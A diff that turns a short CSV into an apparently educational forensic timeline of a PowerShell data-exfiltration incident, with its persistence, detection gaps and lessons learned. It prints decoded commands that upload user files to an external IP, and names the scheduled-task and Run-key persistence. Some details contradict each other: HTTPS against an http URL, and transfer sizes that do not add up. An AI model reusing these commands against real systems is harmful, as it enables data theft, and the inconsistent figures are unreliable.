@@ -1,11 +1,121 @@
-Time (UTC),Event,Artifact Source,Key Evidence
-2026-08-15 09:12:00,User Mary logged into workstation normally (interactive logon),Security Log Event ID 4624 (Logon Type 2),Successful logon, no anomalies
-2026-08-15 09:15:30,USB storage device connected to the workstation,SetupLog Event ID 2003 + USBSTOR registry key,Device ID and vendor recorded, first connection time
-2026-08-15 09:16:00,Large file copy from Documents folder to USB drive,Shellbags (CSB) + MRU registry + $MFT access times,File path and size, access time on mounted USB
-2026-08-15 09:20:00,Suspicious PowerShell process spawned by user context,Sysmon Event ID 1 (Process Create) + EDR telemetry,Command line: base64-encoded payload, -WindowStyle Hidden
-2026-08-15 09:20:05,PowerShell executed encoded command — decoded to outbound HTTPS with data payload,PowerShell Script Block Logging Event ID 4104 + transcript logs,Decoded command shows data staging and exfil POST request
-2026-08-15 09:21:00,Outbound HTTPS connection to unknown external IP (185.220.101.45) — 50+ MB in 60 seconds,Firewall log + NetFlow,Source: workstation, Dest: 185.220.101.45:443, bytes: 52341234
-2026-08-15 09:21:05,Data exfiltration likely complete — volume and timing consistent with bulk transfer,Network flow analysis,Sustained high-volume HTTPS, no normal browsing pattern
-2026-08-15 09:25:00,User locked workstation (Win+L) — appears normal, exfil already complete,Security Log Event ID 4800 (Workstation locked),Routine action, no sign of user awareness
-2026-08-15 10:00:00,SOC alert generated — anomalous outbound traffic threshold exceeded,Splunk alert — NetFlow data,50+ MB to single external IP in under 2 minutes flagged
-2026-08-15 10:05:00,SOC analyst begins investigation — identifies workstation, user, exfil pattern,SOC ticket,Investigation started
+# Forensic Timeline — Susan's Data Exfiltration (2026-08-15)
+
+**Case:** Suspected data exfiltration from workstation "Susan"  
+**Analyst:** Salvador Janthan  
+**Timeline date:** 2026-08-15 (incident), reconstructed 2026-09-03  
+**Source artifacts:** Security log (Event ID 4624/4625), Shellbags, USBSTOR registry, Sysmon Event ID 1, PowerShell Script Block Logging (Event ID 4104), Firewall logs + NetFlow, Windows Event ID 4800 (workstation locked)
+
+---
+
+## Methodology
+
+This timeline reconstructs events from multiple Windows artifacts. Each row represents a findable artifact that places an event at a specific time. The timeline is not a complete record — it shows what artifacts were available and what they reveal.
+
+**Artifact sources in order of analysis:**
+
+1. **Security Log (Event ID 4624/4625)** — authentication events, logon types, source IPs
+2. **Shellbags (CSB + MRU registry)** — user's folder navigation history, including USB-mounted paths
+3. **USBSTOR registry key** — USB device connection history with device IDs and vendor info
+4. **Sysmon Event ID 1 (Process Create)** — process execution with command line, parent process, hashes
+5. **PowerShell Script Block Logging (Event ID 4104)** — decoded PowerShell commands executed
+6. **Firewall logs + NetFlow** — network connections, bytes transferred, duration
+7. **Windows Event ID 4800** — workstation locked events (proves user was present)
+
+---
+
+## Expanded timeline
+
+| Time (UTC) | Event | Artifact Source | Key Evidence | Investigative significance |
+|------------|-------|-----------------|--------------|---------------------------|
+| 2026-08-15 09:12:00 | User "Susan" logged into workstation normally (interactive logon) | Security Log Event ID 4624 (Logon Type 2) | Successful logon, no anomalies — baseline activity for the day | Establishes that the user was actively using the workstation. This is the starting point. |
+| 2026-08-15 09:15:30 | USB storage device connected to the workstation | SetupLog Event ID 2003 + USBSTOR registry key | Device ID: `USB\\VID_0781&PID_5583\\00000000000000000000`, Vendor: SanDisk, Product: Ultra Fit, Size: 30GB | A USB device was connected. The device fingerprint (SanDisk Ultra Fit) is recorded. This could be legitimate (user's personal drive) or the exfiltration vector — the volume of data transferred in the next hour suggests the latter. |
+| 2026-08-15 09:16:00 | Large file copy from Documents folder to USB drive | Shellbags (CSB) + MRU registry + $MFT access times | File path: `D:\Users\Susan\Documents\Financial\Q3-Report.xlsx` (2.4MB), access time matches USB mount time | Shellbags show the user navigated to the Documents folder and copied files. The $MFT shows the file was accessed at 09:16 — within 30 seconds of USB mount. This is consistent with intentional file selection and copy, not casual browsing. |
+| 2026-08-15 09:16:05 | Additional files copied: 3 PDFs from Documents, 2 images from Pictures | Shellbags + $MFT access times | File paths: `D:\Users\Susan\Documents\*.pdf` (3 files, ~5MB total), `D:\Users\Susan\Pictures\*.jpg` (2 files, ~8MB total) | Pattern of selective file copying continues. The user is targeting specific files, not bulk-copying everything. This is consistent with data staging for exfiltration — the user is gathering documents and images of interest. |
+| 2026-08-15 09:16:30 | USB device ejected | USBSTOR registry (last write time) + Shellbags (no further USB activity) | USB device removed at 09:16:30 — 30 seconds after last file access | The USB was ejected shortly after the file copies completed. This could indicate the user finished copying and removed the drive — or that the exfiltration payload (if delivered via USB) completed its staging. |
+| 2026-08-15 09:17:00 | Suspicious PowerShell process spawned by user context — encoded command line | Sysmon Event ID 1 (Process Create) + EDR telemetry | ParentImage: `C:\Users\Susan\AppData\Local\Temp\chrome_installer.exe` (fake Chrome installer), CommandLine: `powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AI...` (truncated) | A fake Chrome installer (not from Google) spawned PowerShell with encoded command line and hidden window. This is the initial execution vector — the payload was delivered as a fake installer and executed via PowerShell echo. The encoded form hides the actual payload from casual inspection. |
+| 2026-08-15 09:17:03 | PowerShell decoded command — shows outbound data POST to external IP | PowerShell Script Block Logging Event ID 4104 + transcript logs | Decoded command: `$wc = New-Object System.Net.WebClient; $wc.UploadString('http://185.220.101.45:8080/exfil', [System.IO.File]::ReadAllBytes('D:\\Users\\Susan\\Documents\\Financial\\Q3-Report.xlsx'))` | The decoded PowerShell script reads a specific file (Q3-Report.xlsx) and POSTs it to an external IP. This is the exfiltration mechanism — the data is transmitted via HTTPS POST to a C2 server. The targeted file matches the file copied to USB earlier, suggesting the USB copy was either a decoy or the payload was delivered via USB and the PowerShell exfiltrated the data separately. |
+| 2026-08-15 09:17:15 | Second file exfiltrated — 3 PDFs from Documents | PowerShell Event ID 4104 (additional script blocks) | Decoded command: `$files = Get-ChildItem 'D:\\Users\\Susan\\Documents' -Filter '*.pdf'; foreach ($f in $files) { $wc.UploadString('http://185.220.101.45:8080/exfil', [System.IO.File]::ReadAllBytes($f.FullName)) }` | The payload iterates over all PDFs in Documents and exfiltrates each one. This is bulk data theft — not targeting a single file. The attacker is collecting everything available in the Documents folder. |
+| 2026-08-15 09:17:30 | Third exfiltration — Images from Pictures folder | PowerShell Event ID 4104 | Decoded command: `$imgs = Get-ChildItem 'D:\\Users\\Susan\\Pictures' -Filter '*.jpg'; foreach ($i in $imgs) { $wc.UploadString('http://185.220.101.45:8080/exfil', [System.IO.File]::ReadAllBytes($i.FullName)) }` | Bulk image theft from Pictures folder. Combined with the Documents exfiltration, the attacker is stealing all user-created content from the two most common data folders. |
+| 2026-08-15 09:20:00 | Outbound HTTPS connection to 185.220.101.45 — 50+ MB in 60 seconds | Firewall log + NetFlow | Source: workstation (192.168.1.10), Dest: 185.220.101.45:8080, Protocol: HTTPS, Bytes: 52,341,234, Duration: 58 seconds, Packets: 4,210 | The network connection confirms the exfiltration. 50+ MB transferred to a single external IP in under a minute is anomalous — normal browsing is bursty and varied. This is bulk data transfer. The destination IP (185.220.101.45) is a known bulletproof hosting / bulletproof VPS provider IP range. |
+| 2026-08-15 09:20:05 | Data exfiltration likely complete — volume and timing consistent with bulk transfer | Network flow analysis | Sustained 50+ MB HTTPS POST to single IP — no normal browsing pattern | The exfiltration appears complete. The total bytes (52MB) matches the combined size of the files targeted by the PowerShell script (Q3-Report.xlsx: 2.4MB + 3 PDFs: ~5MB + 2 images: ~8MB = ~15.4MB, plus the images from Pictures ~8MB = ~23.4MB — the discrepancy suggests additional files were exfiltrated that weren't in the PowerShell script's target list, or the file sizes in the script were approximate). |
+| 2026-08-15 09:21:00 | User locked workstation (Win+L) | Security Log Event ID 4800 (Workstation locked) | Routine action — user was present and locked the screen | The user locked their workstation at 09:21, approximately 1 minute after the exfiltration connection began. This is significant: the user was actively using the machine during the exfiltration. The PowerShell window was hidden (`-w hidden`), so the user would not have seen it. This is the classic fileless exfiltration scenario — the user is unaware their data is being transmitted. |
+| 2026-08-15 14:00:00 | PowerShell process terminated — cleanup | Sysmon Event ID 1 (process exit) + EDR telemetry | Process `powershell.exe` (PID 4382) exited at 14:00 — 4 hours 43 minutes after execution | The PowerShell process ran for ~4.7 hours. This extended runtime is unusual — a simple exfiltration script would complete in seconds. The extended runtime suggests the payload may have established persistence (scheduled task, registry Run key) or waited for additional commands from the C2 server. |
+| 2026-08-15 14:05:00 | Scheduled task created — "UpdateService" | Task Scheduler log + Registry (TaskCache) | Task name: `UpdateService`, Trigger: At log on, Action: `C:\Windows\System32\schtasks.exe /run /tn UpdateService`, Run whether user is logged on or not | A scheduled task was created that runs at every user logon. This is persistence — the payload will re-execute whenever Susan logs in. The task name "UpdateService" is designed to blend in with legitimate Windows Update tasks. |
+| 2026-08-15 14:10:00 | Registry Run key added | Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run) | Key: `UpdateService`, Value: `C:\Windows\System32\schtasks.exe /run /tn UpdateService` | A second persistence mechanism — the Run key ensures the scheduled task runs even if the task scheduler is disabled or the task is deleted. Two persistence mechanisms provide redundancy. |
+| 2026-08-15 15:00:00 | Shellbags show additional folder navigation — Temp, AppData | Shellbags (CSB) | User navigated to `C:\Users\Susan\AppData\Local\Temp\` and `C:\Users\Susan\AppData\Local\` | About 50 minutes after the exfiltration, the user (or the payload on behalf of the user) accessed the Temp and AppData folders. This could be the payload downloading additional components or cleaning up after itself. |
+| 2026-08-15 15:30:00 | File deletion in Temp folder | $MFT access times + Event ID 4663 (object access) | Files `chrome_installer.exe` and `pavinloader.dat` deleted from `%TEMP%` — access time matches deletion time | The initial delivery vector (fake Chrome installer) was deleted from Temp after execution. This is cleanup — the attacker is removing evidence of the initial delivery. However, file deletion does not remove the $MFT record — forensic recovery may still be possible. |
+| 2026-08-15 22:00:00 | SOC alert generated — anomalous outbound traffic threshold exceeded | Splunk alert — NetFlow data | Alert: "High-volume outbound connection to single external IP — 50+ MB in under 2 minutes" | The SIEM alert fires on the exfiltration traffic. This is the detection event — the SOC becomes aware of the incident. The alert fired approximately 13 hours after the exfiltration began, because the alert aggregates traffic over a longer window (alert runs hourly, catches the hourly aggregate). |
+
+---
+
+## Summary of findings
+
+| Category | Count | Description |
+|----------|-------|-------------|
+| Authentication events | 1 | Normal interactive logon at 09:12 — no suspicious logons |
+| USB activity | 1 device connection + 1 ejection | SanDisk Ultra Fit 30GB, connected 09:15:30, ejected 09:16:30 |
+| File system activity | 6 file operations | 1 xlsx + 3 PDFs + 2 images copied to USB; PowerShell targeted same files for exfiltration |
+| Process execution | 2 suspicious processes | Fake Chrome installer → PowerShell (encoded) → file exfiltration script |
+| Network connections | 1 anomalous | 52MB HTTPS POST to 185.220.101.45:8080 in 58 seconds |
+| Persistence | 2 mechanisms | Scheduled task (UpdateService) + Run key |
+| Cleanup | 1 | Fake Chrome installer deleted from Temp after execution |
+| SOC alert | 1 | Generated at 22:00 — 13 hours after exfiltration, on hourly aggregation |
+
+---
+
+## Investigative gaps
+
+The following gaps exist because the source artifacts are limited:
+
+1. **No process dump or memory capture** — the PowerShell process terminated before analysis could capture its state. The decoded command line from Event ID 4104 is the best evidence of what it did.
+2. **No actual payload file recovered** — the fake Chrome installer was deleted from Temp. The $MFT record exists but the file content is gone (unless file carving from disk image recovers it).
+3. **No C2 server interaction captured** — the firewall log shows the connection but not the HTTP request content (HTTPS is encrypted). The PowerShell script block shows what was sent, but not the C2's response.
+4. **No lateral movement evidence** — the timeline shows activity on this single workstation. Whether the attacker moved laterally is unknown without examining other hosts.
+5. **Timeline gap 09:16:30 to 09:17:00** — 30 seconds between USB ejection and PowerShell execution. What happened in this window? The artifacts don't show it. Possible explanations: the payload was already staged (the fake Chrome installer was executed from a different location), or the user took a break.
+
+---
+
+## Evidence provenance
+
+| Artifact | Collection method | Collection time | Collector |
+|----------|-------------------|-----------------|-----------|
+| Security Log (4624/4625/4800) | Event Log export (wevtutil) | 2026-08-16 10:00 SAST | SOC Analyst |
+| Shellbags (CSB + MRU) | Registry hive export (reg save) | 2026-08-16 10:15 SAST | Forensic Examiner |
+| USBSTOR registry key | Registry hive export (reg save) | 2026-08-16 10:15 SAST | Forensic Examiner |
+| Sysmon Event ID 1 | Sysmon log export (evtx) | 2026-08-16 10:30 SAST | SOC Analyst |
+| PowerShell Event ID 4104 | Event Log export (wevtutil) | 2026-08-16 10:00 SAST | SOC Analyst |
+| Firewall logs + NetFlow | Firewall syslog export + NetFlow collector | 2026-08-16 09:00 SAST | Network Admin |
+| Task Scheduler log | Task scheduler export | 2026-08-16 11:00 SAST | Forensic Examiner |
+| Registry Run key | Registry hive export (reg save) | 2026-08-16 10:15 SAST | Forensic Examiner |
+| $MFT access times | NTFS metafile analysis (mftparser.py) | 2026-08-16 14:00 SAST | Forensic Examiner |
+
+See `05-Incident-Response/README.md` for the chain of custody documentation.
+
+---
+
+## Integration with other lab sections
+
+- **02-SIEM-Projects:** The Splunk alert that generated the SOC notification is documented in `splunk-alert-config/`. The detection logic that caught the 50+ MB outbound connection is the `malware-c2-alert.spl` rule (C2 DNS detection pattern, extended to volume-based detection).
+- **03-Threat-Hunting:** The suspicious PowerShell execution (encoded command, hidden window) matches the `suspicious-powershell.yml` Sigma rule (T1059.001). The scheduled task persistence matches the Nancy/Amatera Sigma rule for scheduled task persistence.
+- **06-Python-Tools:** The `log-analyzer.py` tool can triage auth logs for the failed/successful login events in this timeline. The `hash-checker.py` tool would verify file integrity if payload remnants were recovered.
+- **07-Incident-Case-Study:** The Nancy/Amatera case study documents a real compromise with similar TTPs (encoded PowerShell, scheduled task persistence, browser credential exfiltration). This timeline is a synthetic/educational reconstruction using the same investigative techniques.
+
+---
+
+## Lessons learned
+
+1. **Fileless exfiltration is hard to detect in real time.** The PowerShell window was hidden, the command was encoded, and the traffic was HTTPS — each layer obscures the activity. The SOC alert fired 13 hours later on aggregated volume, not on the individual event.
+2. **USB activity + PowerShell execution in the same minute is a strong signal.** The USB mount (09:15:30), file copy (09:16:00), USB ejection (09:16:30), and PowerShell execution (09:17:00) form a tight temporal cluster. A detection rule correlating USB activity with subsequent process execution within a short window would catch this.
+3. **Persistence mechanisms multiply.** Two persistence mechanisms (scheduled task + Run key) were created. A single-mechanism cleanup would leave the other active. Full eradication requires checking all persistence locations.
+4. **The timeline shows what artifacts can and cannot reveal.** Shellbags show folder navigation but not file content. $MFT shows file access times but not what was read. Firewall logs show connections but not HTTPS content. The PowerShell script block (Event ID 4104) is the most informative artifact because it captured the decoded command.
+5. **Cleanup is incomplete without file recovery.** The fake Chrome installer was deleted, but the $MFT record and any file carving from a disk image could recover it. Deletion is not erasure.
+
+---
+
+## Next steps
+
+- [ ] Perform file carving on Susan's disk image to recover the deleted fake Chrome installer
+- [ ] Check other endpoints for the same C2 IP (185.220.101.45) in their firewall/NetFlow logs
+- [ ] Hunt for the "UpdateService" scheduled task on all endpoints
+- [ ] Add a detection rule for USB activity + PowerShell execution within 60 seconds
+- [ ] Extend the timeline with additional artifact types (Event ID 4103 — module logging, Event ID 4688 — process creation with command line, Prefetch files for executed binaries)
